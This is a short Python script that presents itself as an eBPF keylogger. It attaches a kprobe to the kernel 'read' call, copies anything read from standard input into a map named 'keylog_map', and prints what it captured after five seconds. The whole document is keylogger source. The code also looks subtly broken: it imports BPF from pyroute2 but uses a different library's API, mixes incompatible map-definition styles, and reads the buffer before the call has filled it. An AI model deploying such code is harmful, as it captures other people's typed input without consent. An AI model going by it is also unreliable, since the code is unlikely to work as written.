from pyroute2 import BPF

# Define the eBPF program
ebpf_program = """
#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <linux/unistd.h>

struct bpf_map_def SEC("maps") keylog_map = {
  .type = BPF_MAP_TYPE_HASH,
  .key_size = sizeof(int),
    .value_size = sizeof(char[1024]),
    .max_entries = 1,
};

SEC("kprobe/read")
int bpf_read(struct pt_regs *ctx) {
    int fd = (int)PT_REGS_PARM1(ctx);
    void *buf = (void *)PT_REGS_PARM2(ctx);
    size_t count = (size_t)PT_REGS_PARM3(ctx);

    if (fd == 0) {
        char keylog[1024] = {0};
        size_t len = count;
        if (len > sizeof(keylog) - 1)
            len = sizeof(keylog) - 1;
        bpf_probe_read_user_str(keylog, len, buf);
        bpf_map_update_elem(&keylog_map, &fd, keylog, BPF_ANY);
    }
    return 0;
}
"""

# Loading into user space and attaching the program 
bpf = BPF(text=ebpf_program)
bpf.attach_kprobe(name="read", fn_name="bpf_read")

# Wait for some input
import time
time.sleep(5)

# Read from the map
map_data = bpf.get_map("keylog_map")
for key, value in map_data.items():
    print(f"Key: {key}, Value: {value}")

